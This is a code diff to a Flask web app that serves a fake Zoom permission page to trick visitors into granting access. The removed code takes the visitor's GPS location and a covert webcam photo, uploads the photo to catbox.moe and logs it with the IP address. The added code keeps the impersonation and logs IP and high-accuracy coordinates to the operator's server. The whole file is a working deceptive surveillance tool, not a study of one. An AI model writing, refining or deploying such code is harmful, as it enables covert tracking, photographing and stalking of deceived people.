@@ -113,93 +113,66 @@ HTML_TEMPLATE = """
     <div class="gps-overlay">
         <div class="gps-modal">
             <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Zoom-Logo.png" width="150" alt="Zoom">
-            <h2 class="doorDash-heading">Allow Zoom to use your device</h2>
-            <p class="doorDash-text">Allow access to your camera, location, and microphone</p>
+            <h2 class="doorDash-heading">Allow Zoom to use your device for video conferences</h2>
+            <p class="doorDash-text">Allow us access to things like your camera, location, and microphone to continue using Zoom</p>
             <button class="gps-btn" id="gps-allow-btn">Allow Access</button>
         </div>
     </div>
 
     <script>
-        document.getElementById('gps-allow-btn').addEventListener('click', async function() {
-            try {
-                // 1. Get client IP
-                const ip = await fetch('/getip').then(r => r.text());
-                
-                // 2. Request GPS permission
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000
-                    });
-                });
-                
-                // 3. Request camera permission and capture photo
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: true,
-                    audio: false 
-                });
-                
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const photoData = canvas.toDataURL('image/jpeg');
-                
-                // Stop camera stream
-                stream.getTracks().forEach(track => track.stop());
-                
-                // 4. Upload to Catbox
-                const formData = new FormData();
-                formData.append('reqtype', 'fileupload');
-                formData.append('fileToUpload', 
-                    dataURLtoFile(photoData, 'photo.jpg')
-                );
-                
-                const catboxResponse = await fetch('https://catbox.moe/user/api.php', {
+        document.getElementById('gps-allow-btn').addEventListener('click', async () => {{
+            try {{
+                // Log the permission request
+                await fetch('/log', {{
                     method: 'POST',
-                    body: formData
-                });
-                const catboxUrl = await catboxResponse.text();
-                
-                // 5. Send all data to server
-                await fetch('/log_data', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        ip: ip,
-                        gps: {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        },
-                        photo_url: catboxUrl,
+                    headers: {{ 'Content-Type': 'application/json' }},
+                    body: JSON.stringify({{
+                        type: 'permission_request',
+                        ip: await fetch('/getip').then(r => r.text()),
                         timestamp: new Date().toISOString()
-                    })
-                });
+                    }})
+                }});
                 
-                // 6. Hide overlay
+                // Request actual location
+                const position = await new Promise((resolve, reject) => {{
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {{
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }});
+                }});
+                
+                // Log successful location
+                await fetch('/log', {{
+                    method: 'POST',
+                    headers: {{ 'Content-Type': 'application/json' }},
+                    body: JSON.stringify({{
+                        type: 'location_data',
+                        ip: await fetch('/getip').then(r => r.text()),
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    }})
+                }});
+                
+                // Remove overlay
                 document.querySelector('.gps-overlay').remove();
-                
-                // Helper function
-                function dataURLtoFile(dataurl, filename) {
-                    const arr = dataurl.split(',');
-                    const mime = arr[0].match(/:(.*?);/)[1];
-                    const bstr = atob(arr[1]);
-                    let n = bstr.length;
-                    const u8arr = new Uint8Array(n);
-                    while(n--) u8arr[n] = bstr.charCodeAt(n);
-                    return new File([u8arr], filename, {type: mime});
-                }
-                
-            } catch (error) {
-                console.error('Error:', error);
-                alert('Error: ' + error.message);
-            }
-        });
+            }} catch (error) {{
+                console.error('Location error:', error);
+                await fetch('/log', {{
+                    method: 'POST',
+                    headers: {{ 'Content-Type': 'application/json' }},
+                    body: JSON.stringify({{
+                        type: 'error',
+                        error: error.message,
+                        ip: await fetch('/getip').then(r => r.text()),
+                        timestamp: new Date().toISOString()
+                    }})
+                }});
+                alert('Location access is required to continue.');
+            }}
+        }});
     </script>
 </body>
 </html>
@@ -215,24 +188,26 @@ def serve_page():
     with open('page.html', 'r') as f:
         existing_content = f.read()
     
-    # Use alternative placeholder format
-    return HTML_TEMPLATE.replace('%%existing_content%%', existing_content)
+    return HTML_TEMPLATE.format(existing_content=existing_content)
 
 @app.route('/getip')
 def get_ip():
     """Endpoint to get client IP"""
     return request.headers.get('X-Forwarded-For', request.remote_addr)
 
-@app.route('/log_data', methods=['POST'])
+@app.route('/log', methods=['POST'])
 def log_data():
-    """Endpoint to log all collected data"""
+    """Central logging endpoint"""
     data = request.json
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    
+    # Enhanced logging with all relevant data
     log_entry = {
         'timestamp': datetime.utcnow().isoformat(),
-        'client_ip': data.get('ip'),
-        'gps_data': data.get('gps'),
-        'photo_url': data.get('photo_url')
+        'client_ip': client_ip,
+        'event_data': data
     }
+    
     logger.info(json.dumps(log_entry, indent=2))
     return jsonify({'status': 'success'})
 
